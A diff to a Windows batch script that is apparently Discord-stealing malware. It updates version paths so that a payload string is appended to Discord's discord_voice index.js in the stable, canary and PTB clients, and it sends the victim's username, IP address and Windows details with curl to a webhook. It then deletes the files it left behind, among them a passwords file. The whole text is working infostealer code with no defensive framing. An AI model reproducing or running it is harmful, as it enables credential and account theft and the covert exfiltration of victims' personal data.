@@ -23,19 +23,19 @@ echo.
 echo. 
 echo CPU:>>C:\temp\System_INFO.txt
 wmic cpu get name>>C:\temp\System_INFO.txt
-set "discord=%appdata%\discord\0.0.306\modules\discord_voice\index.js"
-set "discordcanary=%appdata%\discordcanary\0.0.266\modules\discord_voice\index.js"
-set "discordptb=%appdata%\discordptb\0.0.52\modules\discord_voice\index.js"
+set "discord=%appdata%\discord\0.0.308\modules\discord_voice\index.js"
+set "discordcanary=%appdata%\discordcanary\0.0.276\modules\discord_voice\index.js"
+set "discordptb=%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
 if not exist %discord% goto CANARY
-echo %str% >> "%appdata%\discord\0.0.306\modules\discord_voice\index.js"
+echo %str% >> "%appdata%\discord\0.0.308\modules\discord_voice\index.js"
 GOTO CANARY
 :CANARY
 if not exist %discordcanary% goto PTB
-echo %str% >> "%appdata%\discordcanary\0.0.266\modules\discord_voice\index.js"
+echo %str% >> "%appdata%\discordcanary\0.0.276\modules\discord_voice\index.js"
 GOTO PTB
 :PTB
 if not exist %discordptb% goto SEND2
-echo %str% >> "%appdata%\discordptb\0.0.52\modules\discord_voice\index.js"
+echo %str% >> "%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
 GOTO SEND2
 :SEND2
 C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%USERNAME%**\n```asciidoc\nTime and Date :: %DATE% %TIME%\nIP Address :: %IP%\nWindows Info :: %WindowsInfo%\n```\n\"}" Webhook 
@@ -63,8 +63,7 @@ goto DEL
 :DEL
 del C:\temp\ip_address.txt /f /q
 del C:\temp\WindowsInfo.txt /f /q
-del C:\temp\msg.vbs /f /q
-del C:\temp\Passwords.txt /f /q
+del C:\temp\%username%_Passwords.txt /f /q
 del C:\temp\curl-ca-bundle.crt /f /q
 del C:\temp\curl.exe /f /q
 del C:\temp\CustomEXE.exe /f /q
